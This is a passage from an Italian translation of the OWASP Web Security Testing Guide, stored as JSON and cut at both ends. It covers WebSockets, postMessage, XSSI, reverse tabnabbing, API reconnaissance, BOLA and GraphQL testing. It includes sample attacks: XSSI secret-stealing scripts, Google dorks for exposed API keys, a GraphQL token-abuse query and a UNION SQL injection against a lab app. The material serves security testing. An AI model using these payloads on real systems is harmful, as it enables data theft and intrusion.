(certificato, vulnerabilità note su TLS, ecc).</p><p>Come per qualsiasi dato proveniente da fonti non attendibili, anche i dati su WebSocket devono essere sanitizzati e codificati correttamente.</p><h3>Obiettivi del test</h3><ul><li>Identificare l’utilizzo dei WebSocket.</li><li>Valutare la loro implementazione, applicando i test usati sulle normali comunicazioni HTTP.</li></ul>",
      "how-to": "<h3>Come testare</h3><ul><li>Analizza il codice client per la presenza di URI ws:// o wss://.</li><li>Usa i Developer Tools di Chrome per monitorare la comunicazione WebSocket.</li><li>Utilizza la tab WebSocket di ZAP.</li></ul><ul><li>Prova a collegarti al server WebSocket tramite un client dedicato. Se la connessione viene accettata senza controllo dell’header Origin, il server potrebbe essere vulnerabile a attacchi cross-domain.</li></ul><ul><li>Verifica che le informazioni sensibili viaggino su WebSocket cifrati (wss://).</li><li>Controlla la sicurezza TLS (certificato valido, assenza di algoritmi deboli come RC4, ecc).</li></ul><ul><li>I WebSocket non gestiscono autenticazione o autorizzazione: è necessario testare le normali logiche di auth con tecniche black-box.</li></ul><ul><li>Usa la funzionalità di replay e fuzzing su ZAP per testare la validazione dei dati via WebSocket.</li></ul><p>Individuata la presenza di WebSocket, ZAP permette di intercettare richieste e risposte, eseguire replay e fuzzing per cercare vulnerabilità.</p><p>Un client WebSocket può essere usato per testare connessioni cross-origin e replay di richieste.</p><p>Il test gray-box (con parziale conoscenza dell’app) permette di usare anche la documentazione API per test più mirati.</p>",
      "tools": "<h3>Strumenti</h3><ul><li>Zed Attack Proxy (ZAP)</li><li>WebSocket Client</li><li>Google Chrome Simple WebSocket Client</li></ul><h3>Riferimenti</h3><ul><li>HTML5 Rocks - Introducing WebSockets</li><li>W3C - The WebSocket API</li><li>IETF - The WebSocket Protocol</li><li>CWE-1385: Missing Origin Validation in WebSockets</li><li>Christian Schneider - Cross-Site WebSocket Hijacking (CSWSH)</li><li>Robert Koch - On WebSockets in Penetration Testing</li><li>DigiNinja - ZAP and Web Sockets</li></ul>",
      "remediation": "",
      "test_objectives": ""
    },
    "WSTG-CLNT-11": {
      "summary": "<h3>Sommario</h3><p>Il Web Messaging (o Cross Document Messaging) consente a applicazioni su domini diversi di comunicare in modo sicuro. Prima della sua introduzione, la Same Origin Policy impediva la comunicazione diretta tra iframe, tab e finestre di origine diversa; i workaround usati dai developer erano spesso insicuri.</p><p>La restrizione serve a evitare che un sito malevolo possa leggere dati confidenziali da altri iframe o tab, ma esistono casi leciti di comunicazione tra siti fidati. Il Cross Document Messaging nasce per questo scopo, e viene implementato tramite il metodo postMessage() introdotto dallo standard HTML5. Il metodo accetta due parametri: il messaggio e il dominio destinatario.</p><p>Ricevere un messaggio richiede la registrazione di un event handler che permette di accedere a:</p><ul><li>Dati del messaggio</li><li>Origine del sender</li><li>Finestra sorgente</li></ul><p>Esempio di invio:</p><pre><code>iframe1.contentWindow.postMessage(\"Hello world\", \"https://www.example.com\");</code></pre><p>Esempio di ricezione:</p><pre><code>window.addEventListener(\"message\", handler, true); function handler(event) { if (event.origin === 'chat.example.com') { /* processa event.data */ } }</code></pre><p>L’origine è formata da schema, hostname e porta (es. https://example.com è diverso da http://example.com).</p><h3>Obiettivi del test</h3><ul><li>Valutare la sicurezza dell’origine dei messaggi.</li><li>Verificare che vengano usati metodi sicuri e validazione degli input.</li></ul>",
      "how-to": "<h3>Come testare</h3><p>Il tester deve controllare che l’applicazione filtri correttamente i messaggi in arrivo e non usi * come dominio destinatario in postMessage(), altrimenti si rischia di inviare dati sensibili a server malevoli. Anche la ricezione deve essere limitata a domini fidati tramite controlli sull’origine.</p><p>I callback devono sempre verificare l’origine prima di elaborare i dati ricevuti. Attenzione: basta un controllo sbagliato (es. <code>indexOf(\".owasp.org\")</code> che matcha anche domini malevoli tipo www.owasp.org.attacker.com) per rendere il filtro inutile.</p><p>Un errore comune è accettare messaggi da qualunque origine:</p><pre><code>window.addEventListener(\"message\", callback, true); function callback(e) { /* processa e.data */ }</code></pre><p>Oppure elaborare direttamente i dati con innerHTML senza sanitizzazione:</p><pre><code>window.addEventListener(\"message\", callback, true); function callback(e) { if (e.origin === \"trusted.domain.com\") { element.innerHTML = e.data; } }</code></pre><p>È preferibile usare innerText per prevenire XSS. Per approfondimenti, vedi la HTML5 Security Cheat Sheet OWASP.</p>",
      "tools": "",
      "remediation": "",
      "test_objectives": ""
    },
    "WSTG-CLNT-12": {
      "summary": "<h3>Sommario</h3><p>I browser offrono diversi meccanismi di storage lato client:</p><ul><li>Local Storage</li><li>Session Storage</li><li>IndexedDB</li><li>Web SQL (deprecato)</li><li>Cookie</li></ul><p>Questi dati sono visibili e modificabili tramite gli strumenti di sviluppo del browser (Chrome DevTools, Firefox Storage Inspector, ecc).</p><p>Nota: la cache viene trattata in una sezione a parte.</p><h3>Obiettivi del test</h3><ul><li>Verificare se vengono salvati dati sensibili nello storage lato client.</li><li>Analizzare il codice che gestisce questi storage per possibili vulnerabilità di injection (input non validati, librerie vulnerabili, ecc).</li></ul>",
      "how-to": "<h3>Come testare</h3><p>window.localStorage fornisce storage persistente key-value accessibile da JavaScript. Chiavi e valori devono essere stringhe; per oggetti si usa JSON.stringify.</p><p>Il contenuto di localStorage resta salvato anche chiudendo il browser (tranne in modalità incognito). Capacità massima variabile secondo il browser.</p><pre><code>for (let i = 0; i < localStorage.length; i++) { const key = localStorage.key(i); const value = localStorage.getItem(key); console.log(`${key}: ${value}`); }</code></pre><p>window.sessionStorage funziona in modo simile ma è effimero: si svuota chiudendo la tab/finestra.</p><pre><code>for (let i = 0; i < sessionStorage.length; i++) { const key = sessionStorage.key(i); const value = sessionStorage.getItem(key); console.log(`${key}: ${value}`); }</code></pre><p>IndexedDB è un database transazionale per dati strutturati, che permette di salvare oggetti complessi (es. CryptoKey). La persistenza è maggiore, ma bisogna fare attenzione a non salvare chiavi crittografiche come extractable: true quando dovrebbero restare inaccessibili.</p><pre><code>const dumpIndexedDB = dbName => { ... }</code></pre><p>Web SQL è deprecato dal 2010.</p><p>I cookie sono usati per la gestione delle sessioni ma possono memorizzare qualsiasi stringa.</p><pre><code>console.log(window.document.cookie);</code></pre><p>Infine, variabili globali assegnate all’oggetto window durano solo per la sessione corrente e vengono perse al refresh.</p><pre><code>window.MY_STATE = { counter: 0, flag: false };</code></pre><p>Un test rapido per elencare proprietà personalizzate:</p><pre><code>(() => { ... })();</code></pre><p>Identificati i vettori di attacco, si possono concatenare in catene più complesse (es. XSS DOM-based).</p>",
      "tools": "",
      "remediation": "<h3>Remediation</h3><p>Le applicazioni dovrebbero memorizzare i dati sensibili solo lato server, seguendo le best practice.</p><h3>Riferimenti</h3><ul><li>Local Storage</li><li>Session Storage</li><li>IndexedDB</li><li>Web Crypto API: Key Storage</li><li>Web SQL</li><li>Cookie</li></ul><p>Per altre risorse OWASP sullo storage HTML5, consulta la Session Management Cheat Sheet.</p>",
      "test_objectives": ""
    },
    "WSTG-CLNT-13": {
      "summary": "<h3>Sommario</h3><p>La vulnerabilità Cross Site Script Inclusion (XSSI) permette la fuoriuscita di dati sensibili tra origini o domini diversi. I dati coinvolti possono includere informazioni di autenticazione (token, session ID, cookie, stato di login, ecc.) oppure dati personali degli utenti (email, numeri di telefono, carte di credito, ecc.). XSSI è un attacco client-side simile al CSRF, ma con uno scopo differente: dove il CSRF usa la sessione autenticata per eseguire azioni non volute dall’utente, l’XSSI punta a rubare dati sensibili tramite JavaScript incluso cross-origin.</p><p>La Same Origin Policy vieta l’accesso a risorse tra domini diversi, ma non si applica alle inclusioni <script>. Questo è necessario per permettere ai siti di integrare servizi esterni (analytics, pubblicità, ecc.), ma crea un potenziale vettore d’attacco: uno script esterno può essere incluso ed eseguito nel contesto del sito. Se contiene dati sensibili, un attacker può esfiltrarli.</p><p>Non solo i file .js sono coinvolti: XSSI può sfruttare anche risposte JSONP, file CSV o formati testuali serviti con header o MIME errati. Esistono anche tecniche avanzate che sfruttano il charset o le differenze tra browser. Browser obsoleti (es. IE9/10) sono più vulnerabili, ma anche oggi restano scenari di rischio, soprattutto con risposte dinamiche.</p><h3>Obiettivi del test</h3><ul><li>Individuare dati sensibili nell’applicazione.</li><li>Valutare la possibilità di fuoriuscita dati tramite tecniche XSSI.</li></ul>",
      "how-to": "<h3>Come testare</h3><p>Per prima cosa identifica gli endpoint che espongono dati sensibili e verifica quali richiedano sessione autenticata. Presta particolare attenzione a risposte JSONP, JavaScript dinamico, API key, token o informazioni utente. Confronta le risposte autenticate e non autenticate: se variano, lo script è potenzialmente esposto.</p><p>Un esempio classico è l’inclusione di una variabile JavaScript globale in un file accessibile solo a utenti autenticati:</p><pre><code>// https://victim.com/internal/api.js\n(function(){window.secret = \"supersecretUserAPIkey\";})();</code></pre><p>Un attacker può includere questo script nella propria pagina e, sfruttando una sessione utente aperta, esfiltrare la variabile:</p><pre><code>// index.html su attackingwebsite.com\n<script src=\"https://victim.com/internal/api.js\"></script>\n<script>document.write(window.secret);</script></code></pre><p>Un altro esempio prevede l’abuso di funzioni globali:</p><pre><code>// https://victim.com/internal/api.js\n(function(){var secret = \"supersecretAPIkey\";window.globalFunction(secret);})();</code></pre><pre><code>// Attacker sovrascrive globalFunction\n<script>function globalFunction(param){alert(param);}</script>\n<script src=\"https://victim.com/internal/api.js\"></script></code></pre><p>XSSI può sfruttare anche errori MIME (es. risposte CSV, JSON, ecc. servite come script) o il comportamento di oggetti nativi JavaScript, come Array, tramite prototype pollution o override di funzioni (es. Array.prototype.forEach).</p><p>Inoltre, vulnerabilità note hanno permesso in passato di esfiltrare dati tramite errori JS visualizzati dal browser (es. IE9/10):</p><pre><code><script>window.onerror=function(e){alert(e);}</script>\n<script src=\"https://victim.com/service/csvendpoint\"></script></code></pre><p>Altre tecniche includono l’iniezione in file CSV/JSON/JS dove è possibile chiudere stringhe o inserire callback.</p>",
      "tools": "",
      "remediation": "",
      "test_objectives": ""
    },
    "WSTG-CLNT-14": {
      "summary": "<h3>Sommario</h3><p>Il Reverse Tabnabbing è un attacco che consente di redirigere l’utente verso una pagina di phishing dopo aver aperto un link in una nuova scheda. Questo succede quando un link <a> ha l’attributo target=\"_blank\" senza rel=\"noopener noreferrer\". In questa configurazione, la pagina aperta può modificare la pagina originale tramite <code>window.opener.location</code>, dirottandola su un dominio controllato dall’attaccante.</p><p>L’utente difficilmente si accorge della redirezione, specialmente se il phishing replica il sito originale. Tutte le credenziali inserite finiscono così all’attaccante. Anche l’uso di window.open lato JavaScript senza i dovuti accorgimenti può esporre alla stessa vulnerabilità.</p><p>NOTA: il problema riguarda soprattutto browser datati (es. Chrome <88, Internet Explorer), ma è buona pratica prevenire sempre il rischio.</p><p>Esempio: un utente può inserire una URL nel proprio profilo. Se la pagina aperta contiene:</p><pre><code><script>window.opener.location=\"https://example.org\";</script></code></pre><p>Quando il link viene cliccato (target=\"_blank\"), la tab originale viene dirottata su example.org, potenziale pagina di phishing.</p>",
      "how-to": "<h3>Come testare</h3><ul><li>Controlla il codice HTML per link con target=\"_blank\" e verifica che abbiano rel=\"noopener noreferrer\". Se mancano questi attributi, la vulnerabilità è probabile.</li><li>Identifica punti dove un attacker può controllare l’href di un link e inserisci un link che punta a una pagina con <code>window.opener.location=…</code>. Se la tab originale si redirige, l’attacco è possibile (testabile anche in IE se i browser moderni sono protetti).</li></ul>",
      "tools": "",
      "remediation": "<h3>Remediation</h3><p>Impostare sempre l’attributo rel con noopener e noreferrer su tutti i link con target=\"_blank\".</p><h3>Riferimenti</h3><ul><li>Tabnabbing - HTML5 Cheat Sheet</li><li>The target=”_blank” vulnerability by example</li><li>About rel=noopener</li><li>Target=”_blank” — the most underestimated vulnerability ever</li><li>Reverse tabnabbing vulnerability affects IBM Business Automation Workflow and IBM Business Process Manager</li></ul>",
      "test_objectives": ""
    },
    "WSTG-APIT-01": {
      "summary": "<h3>Sommario</h3><p>La ricognizione è una fase importante in ogni engagement di penetration testing, incluse le attività di pentesting API. La ricognizione migliora significativamente l'efficacia del processo di testing, permettendo di raccogliere informazioni sull’API e sviluppare una comprensione del target. Questa fase non solo aumenta la probabilità di scoprire problemi di sicurezza critici, ma garantisce anche una valutazione completa della postura di sicurezza delle API.</p><p>Questa guida include una sezione sulla raccolta delle informazioni che si applica anche durante l’audit delle API. Tuttavia, esistono alcune differenze. In qualità di ricercatori di sicurezza, ci si concentra spesso su aree specifiche, e cercare le sezioni pertinenti può richiedere tempo. Per offrire un unico punto di riferimento focalizzato sulle API, questa sezione si concentra sugli aspetti specifici e fornisce riferimenti ai contenuti di supporto nel resto della guida.</p><p>Le API possono essere pubbliche o private.</p><p>Le API pubbliche di solito pubblicano i loro dettagli in un documento Swagger/OpenAPI. Ottenere questo documento è importante per comprendere la superficie d’attacco. Ugualmente importante è trovare versioni precedenti di questo documento che potrebbero mostrare codice deprecato ma ancora funzionante e potenzialmente vulnerabile.</p><p>Si tenga presente che questo documento, sebbene ben intenzionato, potrebbe non essere accurato e potrebbe non divulgare l’intera API.</p><p>Le API pubbliche possono anche essere documentate in librerie condivise o directory di API.</p><p>La visibilità delle API private dipende da chi è il consumatore previsto. Un’API può essere privata ma accessibile solo a client sottoscritti (partner) o accessibile solo a client interni, come altri dipartimenti della stessa azienda. Trovare API private tramite tecniche di ricognizione è anch’esso importante. Queste API possono essere scoperte tramite una serie di tecniche che saranno discusse di seguito.</p><h3>Obiettivi del test</h3><ul><li>Trovare tutti gli endpoint API supportati dal backend, documentati o meno.</li><li>Trovare tutti i parametri per ogni endpoint supportato dal backend, documentati o meno.</li><li>Scoprire dati interessanti relativi alle API in HTML e JavaScript inviati ai client.</li></ul>",
      "how-to": "<h3>Come testare</h3><p>Sia nei casi pubblici che privati, la documentazione dell’API sarà utile a seconda della sua qualità e accuratezza. La documentazione pubblica delle API è solitamente condivisa con tutti, mentre quella privata solo con i client previsti. Tuttavia, in entrambi i casi, trovare documentazione — trapelata accidentalmente o meno — sarà utile durante l’indagine.</p><p>Indipendentemente dalla visibilità dell’API, cercare la documentazione può portare alla scoperta di versioni precedenti, non ancora pubblicate o trapelate accidentalmente. Questa documentazione sarà molto utile per capire quale sia la superficie d’attacco esposta dall’API.</p><p>Fonti alternative di documentazione API possono includere directory di API, come:</p><ul><li>GitHub in generale</li><li>GitHub Public APIs Repository</li><li>APIs.guru</li><li>RapidAPI</li><li>PublicAPIs and PublicAPIs</li><li>Postman API Network</li></ul><p>Se la documentazione non è immediatamente evidente, puoi cercare attivamente sul target per documenti dai nomi comuni:</p><ul><li>/api-docs</li><li>/doc</li><li>/swagger</li><li>/swagger.json</li><li>/openapi.json</li><li>/.well-known/schema-discovery</li></ul><p>robots.txt è un file di testo che i proprietari di siti creano per istruire i web crawler su come effettuare il crawling e l’indicizzazione del sito. Questo file può fornire indizi aggiuntivi sulla struttura dei path o degli endpoint delle API.</p><p>La sezione Information Gathering fa riferimento a robots.txt in diversi casi, inclusi WSTG-INFO-01, WSTG-INFO-03, WSTG-INFO-05 e WSTG-INFO-08.</p><p>Se l’applicazione utilizza repository GitHub, GitLab o altri repository pubblici, possiamo anche cercare indizi o contenuti sensibili (GitDorking). Queste informazioni possono includere password, API key, file di configurazione e altri dati riservati che gli sviluppatori possono accidentalmente includere nei loro repository.</p><p>Anche se disponi della documentazione, è consigliato navigare l’applicazione. La documentazione può essere obsoleta, inaccurata o incompleta.</p><p>Usando un proxy di intercettazione come ZAP o Burp Suite, puoi registrare gli endpoint per ispezionarli successivamente. Utilizzando le funzionalità di spidering integrate, puoi generare una lista completa degli endpoint. Dalle URL individuate cerca quelle che usano naming comuni per le API, come:</p><ul><li>https://example.com/api/v1 (o v2 ecc)</li><li>https://example.com/graphql</li></ul><p>Oppure sottodomini utilizzati come API gateway:</p><ul><li>https://api.example.com/api/v1</li></ul><p>È importante esercitare quanta più funzionalità possibile sull’applicazione per generare una lista completa degli endpoint e per evitare problemi di lazy loading e code splitting. Il tuo test dovrebbe includere account di esempio con diversi livelli di privilegi.</p><p>Una volta terminata la navigazione e lo spidering, le informazioni raccolte possono essere usate per comporre una documentazione API della destinazione con altri strumenti come Postman.</p><p>Utilizza tecniche di ricognizione passiva come Google Dorking con direttive come site e inurl. Esempi:</p><p>site:\"mysite.com\" inurl:\"/api\"</p><p>inurl:apikey filetype:env</p><p>Altre keyword: \"v1\", \"api\", \"graphql\".</p><p>Estendi la ricerca anche ai sottodomini del target.</p><p>Le wordlist sono utili per avere un elenco completo di nomi comuni utilizzati nelle API.</p><p>Le API cambiano nel tempo, ma versioni deprecate o vecchie potrebbero essere ancora operative per errore o configurazione errata. Dovrebbero essere testate perché spesso contengono vulnerabilità già corrette nelle versioni più recenti. Anche le modifiche alle API mostrano nuove funzionalità che potrebbero essere meno robuste.</p><p>Per trovare versioni vecchie possiamo usare la Wayback Machine. Strumenti come WayBackUrls recuperano tutte le URL che la Wayback Machine conosce per un dominio.</p><ul><li>WayBackUrls</li><li>waymore</li><li>gau</li></ul><p>Una fonte eccellente di informazioni sono HTML e JavaScript inviati al client. A volte, l’app client rivela accidentalmente endpoint, chiavi API o segreti. La sezione Review Web Page Content for Information Leakage fornisce ulteriori dettagli.</p><p>Per analizzare i file JavaScript, puoi usare strumenti che sfruttano regex o AST per individuare pattern sospetti.</p><p>L’enumerazione attiva degli endpoint può essere fatta con tool come FFUF, DirBuster, GoBuster e KiteRunner utilizzando wordlist specifiche (SecLists, GraphQL Wordlist, Assetnote).</p><p>Esempio GoBuster:</p><p>gobuster dir -u <target url> -w <wordlist file></p><h3>Riferimenti</h3><ul><li>REST Assessment Cheat Sheet</li></ul><ul><li>Corey J. Ball - “Hacking APIs : breaking web application programming interfaces”, No Starch, 2022 - ISBN-13: 978-1-7185-0244-4</li><li>Confidence Staveley - “API Security for White Hat Hackers, Packt, 2024 - ISBN 978-1-80056-080-2</li></ul>",
      "tools": "",
      "remediation": "",
      "test_objectives": ""
    },
    "WSTG-APIT-02": {
      "summary": "<h3>Sommario</h3><p>La Broken Object Level Authorization (BOLA) si verifica quando un’API non applica correttamente i controlli di autorizzazione per ogni oggetto a cui accede il client. Gli aggressori possono manipolare gli identificatori degli oggetti nelle richieste API (come ID, GUID o token) per accedere o modificare risorse per cui non sono autorizzati. Questa vulnerabilità è critica nelle API a causa dell’accesso diretto agli oggetti sottostanti e della diffusione delle API nelle applicazioni moderne.</p><p>Lo sfruttamento della BOLA può portare a accessi non autorizzati a dati sensibili, impersonificazione di utenti, escalation orizzontale dei privilegi (accesso alle risorse di altri utenti) ed escalation verticale dei privilegi (acquisizione non autorizzata di accessi di livello amministrativo).</p><h3>Obiettivi del test</h3><ul><li>L’obiettivo di questo test è identificare se l’API applica correttamente i controlli di autorizzazione a livello di oggetto, garantendo che gli utenti possano accedere e manipolare solo gli oggetti per cui sono autorizzati.</li></ul>",
      "how-to": "<h3>Come testare</h3><p>Rivedi la documentazione dell’API (ad es. specifica OpenAPI), il traffico o utilizza un proxy di intercettazione (ad es. Burp Suite, ZAP) per identificare gli endpoint che accettano identificatori di oggetti di interesse. Questi possono essere sotto forma di ID, UUID o altri riferimenti.</p><p>Esempi:</p><ul><li>GET /api/users/{user_id}</li><li>GET /api/orders/{order_id}</li><li>POST /graphqlquery: {user(id: \"123\") }</li></ul><br><p>Con le informazioni ottenute nel passaggio precedente, rivedi e raccogli identificatori di oggetti di terze parti (ad es. ID utente, ID ordine, ecc.) che possono essere usati successivamente nella manipolazione degli identificatori degli oggetti.</p><p>Inoltre, genera un elenco di possibili identificatori di oggetti da testare con brute-force. Ad esempio, se un’API recupera un ordine di acquisto da un utente autenticato, genera vari ID di ordine di acquisto per i test.</p><p>Con l’obiettivo di determinare se gli utenti possono accedere o modificare oggetti che non possiedono alterando gli identificatori degli oggetti nella richiesta API, modifica l’identificatore dell’oggetto (ad esempio, user ID, order ID) nell’URL o nel body della richiesta.</p><p>Esempio: modifica una richiesta come GET /api/users/123/profile (dove 123 è l’ID utente corrente) in GET /api/users/124/profile (dove 124 è l’ID di un altro utente).</p><p>A seconda del contesto dell’applicazione, utilizza due account diversi per eseguire i test. Con un account A, crea risorse che appartengano esclusivamente a quell’account (ad es. un ordine di acquisto) e con un account B prova ad accedere alla risorsa dell’account A.</p><p>Testa i vari metodi HTTP per vulnerabilità BOLA:</p><ul><li>GET: Prova ad accedere a oggetti non autorizzati manipolando l’ID oggetto nella richiesta.</li><li>POST/PUT/PATCH: Tenta di creare o modificare oggetti appartenenti ad altri utenti.</li><li>DELETE: Prova a cancellare un oggetto di proprietà di un altro utente.</li></ul><p>Per le API GraphQL, invia una query con un ID oggetto modificato nei parametri della query (vedi Testing GraphQL):</p><p>Esempio: query { user(id: \"124\") { name, email } } .</p><p>Verifica se l’API consente accessi bulk non autorizzati a oggetti. Questo può avvenire su endpoint che restituiscono liste di oggetti.</p><p>Esempio: GET /api/users restituisce dati per tutti gli utenti invece che solo i dati dell’utente autenticato.</p><h3>Indicatori di BOLA</h3><ul><li>Sfruttamento riuscito: Se la modifica di un ID oggetto nella richiesta restituisce dati o consente azioni su oggetti appartenenti ad altri utenti, l’API è vulnerabile a BOLA.</li><li>Risposte di errore: API correttamente protette in genere restituiscono 403 Forbidden o 401 Unauthorized per accessi non autorizzati agli oggetti. Una risposta 200 OK per l’oggetto di un altro utente indica BOLA.</li><li>Risposte incoerenti: Se alcuni endpoint applicano l’autorizzazione e altri no, si evidenziano controlli di sicurezza incompleti o incoerenti.</li></ul>",
      "tools": "<h3>Strumenti</h3><ul><li>ZAP: Scanner automatici o strumenti proxy manuali possono aiutare a testare i riferimenti agli oggetti nelle richieste API.</li><li>Burp Suite: Usa le funzioni Repeater o Intruder per manipolare gli ID degli oggetti e inviare più richieste per testare il controllo degli accessi.</li><li>Postman: Invia richieste con ID oggetto alterati e osserva le risposte.</li><li>Strumenti di fuzzing: Usa fuzzers per brute-forzare gli ID oggetto e verificare accessi non autorizzati.</li></ul><h3>Riferimenti</h3><ul><li>OWASP API Security Top 10: BOLA</li><li>OWASP Testing Guide: Testing for Insecure Direct Object References (IDOR)</li><li>OWASP Testing Guide: Testing for GraphQL</li></ul>",
      "remediation": "<h3>Remediation</h3><ul><li>Controlli sulla proprietà degli oggetti: Assicurarsi che i controlli di autorizzazione a livello di oggetto siano eseguiti per ogni richiesta API. Verifica sempre che l’utente che effettua la richiesta sia autorizzato ad accedere all’oggetto richiesto.</li><li>Controllo degli accessi basato sui ruoli (RBAC): Implementa policy RBAC che definiscono quali ruoli possono accedere o modificare oggetti specifici.</li><li>Principio del privilegio minimo: Applica il principio del privilegio minimo, garantendo che gli utenti possano accedere solo al minimo insieme di oggetti necessario per il loro ruolo.</li><li>Utilizzo di UUID o ID non sequenziali: Preferisci identificatori di oggetti non prevedibili e non sequenziali (ad es. UUID invece di semplici interi) per rendere più difficile l’enumerazione e gli attacchi brute-force.</li></ul>",
      "test_objectives": ""
    },
    "WSTG-APIT-99": {
      "summary": "<h3>Sommario</h3><p>GraphQL è diventato molto popolare nelle API moderne. Offre semplicità e oggetti annidati, facilitando uno sviluppo più rapido. Come ogni tecnologia, tuttavia, può esporre l’applicazione a nuove superfici di attacco. Lo scopo di questo scenario è fornire alcune comuni errate configurazioni e vettori di attacco su applicazioni che utilizzano GraphQL. Alcuni vettori sono unici di GraphQL (ad esempio, la Introspection Query), altri sono comuni alle API (ad esempio, SQL injection).</p><p>Gli esempi in questa sezione si basano su una applicazione vulnerabile poc-graphql, che viene eseguita in un container Docker che mappa localhost:8080/GraphQL come nodo GraphQL vulnerabile.</p><h3>Obiettivi del test</h3><ul><li>Verificare che sia implementata una configurazione sicura e pronta per la produzione.</li><li>Validare tutti i campi di input contro attacchi generici.</li><li>Assicurarsi che siano applicati adeguati controlli di accesso.</li></ul>",
      "how-to": "<h3>Come testare</h3><p>Testare i nodi GraphQL non è molto diverso dal testare altre tecnologie API. Considera i seguenti passaggi:</p><p>Le introspection queries sono il metodo con cui GraphQL permette di chiedere quali query sono supportate, quali tipi di dati sono disponibili e molti altri dettagli che saranno necessari per avvicinarsi a un test di una distribuzione GraphQL.</p><p>Il sito ufficiale GraphQL descrive l’Introspection così:</p><p>«Spesso è utile chiedere a uno schema GraphQL quali query supporta. GraphQL ci permette di farlo tramite il sistema di introspezione!»</p><p>Esistono vari modi per estrarre queste informazioni e visualizzarne l’output.</p><p>Il modo più diretto è inviare una richiesta HTTP (usando un proxy personale) con il seguente payload, tratto da un articolo su Medium:</p><pre><code>query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ... FullType } directives { name description locations args { ... InputValue } } } } fragment FullType on __Type { kind name description fields ( includeDeprecated : true ) { name description args { ... InputValue } type { ... TypeRef } isDeprecated deprecationReason } inputFields { ... InputValue } interfaces { ... TypeRef } enumValues ( includeDeprecated : true ) { name description isDeprecated deprecationReason } possibleTypes { ... TypeRef } } fragment InputValue on __InputValue { name description type { ... TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } } }</code></pre><p>Il risultato sarà solitamente molto lungo (e qui è stato abbreviato) e conterrà l’intero schema della distribuzione GraphQL.</p><p>Risposta:</p><pre><code>{ \"data\" : { \"__schema\" : { \"queryType\" : { \"name\" : \"Query\" }, ... } } }</code></pre><p>Uno strumento come GraphQL Voyager può essere utilizzato per comprendere meglio l’endpoint GraphQL:</p><p>Figura 12.1-1: GraphQL Voyager</p><br><p>Questo strumento crea una rappresentazione ERD (Entity Relationship Diagram) dello schema GraphQL, permettendo una migliore visione delle componenti del sistema in test. Ad esempio, si può vedere che è possibile interrogare la tabella Dog e quali proprietà ha:</p><ul><li>ID</li><li>name</li><li>veterinary (ID)</li></ul><p>Un limite di questo metodo è che GraphQL Voyager non mostra tutte le operazioni disponibili, ad esempio le mutation non vengono visualizzate. Una strategia migliore è usare Voyager insieme ad altri metodi elencati sotto.</p><p>GraphiQL è un IDE web per GraphQL, parte del progetto GraphQL e usato soprattutto per debugging o sviluppo. La best practice è non renderlo accessibile in produzione. Se si sta testando un ambiente di staging, potrebbe essere accessibile e far risparmiare tempo nell’uso delle introspection query (che si possono comunque usare direttamente da GraphiQL).</p><p>GraphiQL dispone di una sezione documentazione che usa i dati dello schema per creare un documento dell’istanza GraphQL in uso, contenente tipi, mutation e tutte le informazioni ricavabili tramite introspection.</p><p>GraphQL Playground è un client GraphQL. Può essere usato per testare diverse query, suddividere gli IDE GraphQL in playground tematici, ecc. Come GraphiQL, può generare la documentazione senza inviare manualmente introspection query. Inoltre, non necessita che l’interfaccia GraphiQL sia disponibile: può essere puntato direttamente al nodo GraphQL via URL, o usato localmente con un file di dati. GraphQL Playground può essere usato per testare direttamente le vulnerabilità, senza proxy HTTP. Per payload avanzati si consiglia comunque l’uso di proxy.</p><p>Nota che in alcuni casi sarà necessario impostare manualmente gli header HTTP (ad esempio session ID) per autenticarsi. Questo consente di creare più “IDE” con diversi permessi e verificare eventuali problemi di autorizzazione.</p><p>Figura 12.1-2: GraphQL Playground API Docs</p><br><p>Figura 12.1-3: GraphQL Playground API Schema</p><br><p>È anche possibile scaricare gli schemi per usarli in Voyager.</p><p>L’introspection è utile per ottenere informazioni sulla distribuzione GraphQL, ma permette anche agli utenti malintenzionati di ottenere le stesse informazioni. La best practice è limitare l’accesso alle introspection query, poiché la disabilitazione totale può rompere alcune funzionalità. Dato che GraphQL funge spesso da bridge con le API backend, è consigliato applicare controlli di accesso molto rigorosi.</p><p>L’introspection è il primo punto da verificare per i problemi di autorizzazione. L’accesso dovrebbe essere ristretto perché permette l’estrazione di dati e informazioni sensibili. Una volta ottenuto lo schema, il tester può inviare query che non vengono bloccate per mancanza di privilegi. GraphQL di default non applica permessi: è responsabilità dell’applicazione.</p><p>Negli esempi precedenti, l’output della introspection query mostra una query auth, che sembra un buon punto per estrarre dati sensibili (token API, password, ecc.).</p><p>Figura 12.1-4: GraphQL Auth Query API</p><br><p>Testare l’implementazione dell’autorizzazione varia da un’installazione all’altra. Ogni schema avrà informazioni sensibili e target differenti.</p><p>Nell’esempio vulnerabile, qualsiasi utente (anche non autenticato) può ottenere i token auth di tutti i veterinari presenti nel database. Questi token possono essere usati per azioni come associare/disassociare un cane da un veterinario tramite mutation, anche senza avere un token valido per quel veterinario.</p><p>Esempio di uso di un token estratto per agire come il veterinario “Benoit”:</p><pre><code>query brokenAccessControl { myInfo ( accessToken : \"...\" , veterinaryId : 2 ){ id , name , dogs { name } } }</code></pre><p>Risposta:</p><pre><code>{ \"data\" : { \"myInfo\" : { \"id\" : 2 , \"name\" : \"Benoit\" , \"dogs\" : [ { \"name\" : \"Babou\" }, ... ] } } }</code></pre><p>Tutti i cani elencati appartengono a Benoit, non al proprietario del token auth. Questo tipo di azione è possibile se non sono applicati controlli di autorizzazione corretti.</p><p>GraphQL implementa lo strato API di un’applicazione e in genere inoltra le richieste direttamente a una API backend o al database. Questo permette di sfruttare eventuali vulnerabilità sottostanti come SQL injection, command injection, XSS, ecc. GraphQL cambia solo il punto di ingresso del payload.</p><p>Consulta altri scenari nella OWASP Testing Guide per spunti aggiuntivi.</p><p>GraphQL include anche i cosiddetti scalar, tipicamente usati per tipi di dato personalizzati non nativi (es. DateTime). Questi tipi spesso non hanno validazione integrata, quindi sono candidati per i test.</p><p>L’applicazione di esempio è vulnerabile nella query dogs(namePrefix: String, limit: Int = 500): [Dog!], dove il parametro namePrefix viene concatenato in una query SQL. Concatenare input utente è una cattiva pratica che espone a SQL injection.</p><p>La seguente query estrae informazioni dalla tabella CONFIG nel database:</p><pre><code>query sqli { dogs ( namePrefix : \"ab%' UNION ALL SELECT 50 AS ID, C.CFGVALUE AS NAME, NULL AS VETERINARY_ID FROM CONFIG C LIMIT ? -- \" , limit : 1000 ) { id name } 